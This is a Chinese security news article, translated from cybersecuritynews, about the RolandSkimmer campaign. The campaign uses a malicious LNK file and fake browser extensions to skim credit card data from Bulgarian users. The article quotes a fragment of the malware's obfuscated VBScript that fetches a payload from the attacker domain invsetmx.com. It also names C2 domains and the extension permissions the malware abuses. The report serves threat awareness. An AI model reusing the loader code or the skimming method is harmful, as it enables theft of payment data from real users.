---
title: 警惕 ！RolandSkimmer 利用浏览器扩展实施信用卡盗刷
url: https://www.anquanke.com/post/id/306243
source: 安全客-有思想的安全新媒体
date: 2025-04-08
fetch_date: 2025-10-06T22:02:44.661106
---

# 警惕 ！RolandSkimmer 利用浏览器扩展实施信用卡盗刷

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 警惕 ！RolandSkimmer 利用浏览器扩展实施信用卡盗刷

阅读量**56729**

发布时间 : 2025-04-07 11:14:21

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/new-credit-card-skimming-attack/>

译文仅供参考，具体内容表达以及含义原文为准。

一种复杂的新型信用卡盗刷活动已经出现，名为 RolandSkimmer，主要通过恶意浏览器扩展程序瞄准保加利亚的用户。

该攻击以其有效负载中嵌入的独特字符串 “Rol@and4You” 命名，它标志着基于网络的金融盗窃技术有了令人担忧的发展变化。

这种恶意软件会系统地从受害者那里获取敏感的支付信息，同时通过被攻陷的网络浏览器持续访问受害者的系统。

攻击始于一个名为 “faktura\_3716804.zip” 的欺骗性压缩文件，里面包含一个看似无害的快捷方式文件。

一旦这个 LNK 文件被执行，它就会启动一系列复杂的经过混淆处理的脚本，从而建立对受害者系统的秘密访问通道。

与直接针对电子商务网站的传统盗刷器不同，RolandSkimmer 专注于攻陷浏览器本身，形成一种会跟随用户访问多个网站的持续性威胁。

RolandSkimmer 特别危险的地方在于它采用了多浏览器攻击方式，通过定制的恶意扩展程序同时瞄准 Google Chrome、Microsoft Edge 和 Mozilla Firefox。

这些扩展程序会请求广泛的权限，包括读取所有网页内容、修改网络请求以及访问浏览数据的能力，从而能够全面监控受害者的在线活动。

攻击者采用了复杂的混淆技术来逃避检测，使用了异或（XOR）编码的有效负载和动态生成的组件。

Fortinet 的研究人员在 2025 年 3 月发现了这一攻击活动，并记录了恶意软件是如何通过创建隐藏文件夹和修改浏览器快捷方式来实现持续存在的。

FortiGuard Labs 在其最近的分析中指出：“这代表了金融盗窃恶意软件中一个令人担忧的趋势。” 并强调了这种威胁所具备的复杂逃避检测机制和跨浏览器攻击能力。

RolandSkimmer 背后的操作者构建了一个精心设计的命令与控制基础设施，涉及多个域名，包括 invsetmx [.] com、exmkleo [.] com 和 bg3dsec [.] com。

这些服务器会发送恶意有效负载，并充当被盗取的金融数据的收集点。每个受害者都被分配了一个唯一的跟踪标识符，以便在浏览会话中监控他们的活动。

### ****感染机制和扩展程序部署****

最初的感染过程始于用户解压并点击恶意的 LNK 文件，这会执行一系列经过大量混淆处理的脚本链。

这个脚本会连接到攻击者的服务器，并下载伪装成虚假扩展程序的其他组件。

其中一个关键组件伪装成一个 JPEG 图像文件（n.jpg），但实际上包含直接在内存中执行而不会写入磁盘的 VBScript 代码。

on error resume next:q1=”8a9b1c3″:for q2=1 to 76046:if q7=q6 then:q8=””:else:q8=q6:

q7=q6:end if:Set q3=CreateObject(“MSXML2.ServerXMLHTTP.6.0”):q3.open “GET”,

“http://invsetmx.com/default.aspx?V=”&q2&”&R=#-@-“&q8,False:q3.send:q4=Split(

q3.responseText,”-@-“):if q5=q4(1) then:else:q5=q4(1):q9 = “”:For w1=1 to Len(q4(1))

然后，恶意软件会进行系统侦查，收集环境细节，包括检查已安装的浏览器和硬件规格。

对于 Microsoft Edge，它会在 “% APPDATA%..\Local\s2ch97” 路径下创建一个文件夹，里面包含一个伪装成 “禁用内容安全策略（Disable Content Security Policy）” 的恶意扩展程序。

这个扩展程序的清单请求了广泛的权限，包括 “declarativeNetRequest”、“browsingData”、“tabs” 和 “storage”。

该扩展程序的后台脚本会监控所有网站上的表单提交情况，专门瞄准信用卡号码。当检测到支付详情时，恶意代码会在被盗取的数据后面附加独特的标记 “Rol@and4You”，并通过页面中的隐藏元素将数据泄露到远程服务器上。

这种精心设计的攻击链使得攻击者无需提升权限就能持续访问，让他们能够长期访问受害者的浏览器和金融信息。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/new-credit-card-skimming-attack/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306243](/post/id/306243)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/new-credit-card-skimming-attack/)

如若转载,请注明出处： <https://cybersecuritynews.com/new-credit-card-skimming-attack/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**2赞

收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)